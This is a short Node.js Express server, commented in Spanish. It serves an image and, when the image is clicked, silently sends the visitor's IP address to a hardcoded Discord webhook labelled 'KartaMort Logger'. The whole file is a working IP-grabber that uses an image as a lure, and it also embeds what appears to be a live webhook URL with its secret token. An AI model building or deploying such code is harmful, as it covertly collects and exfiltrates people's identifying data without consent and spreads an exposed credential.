const express = require('express');
const path = require('path');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args)); // Importar 'node-fetch'
const app = express();

// Configuramos Express para servir archivos estáticos desde la carpeta 'public'
app.use(express.static(path.join(__dirname, 'public')));

// Ruta para servir la imagen
app.get('/img/kartamort.png', (req, res) => {
  const imagePath = path.join(__dirname, 'public', 'kartamort.png');
  res.sendFile(imagePath);
});

// Ruta para manejar la solicitud del clic en la imagen
app.post('/click-imagen', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const payload = {
    username: "KartaMort Logger",
    content: `IP: ${ip}`
  };

  fetch("https://discord.com/api/webhooks/1360813090098122913/BW90Lv2Z2rKvNKl5fCChCECvJbtgwoamIVKfh7CYlACRnHDjKtICaU_KVA-93D_9efiI", {
    method: "POST",
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  }).catch(err => console.error("Error en el webhook:", err));

  res.status(200).send("IP registrada");
});

// Configuramos el puerto
const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`Servidor corriendo en el puerto ${port}`);
});
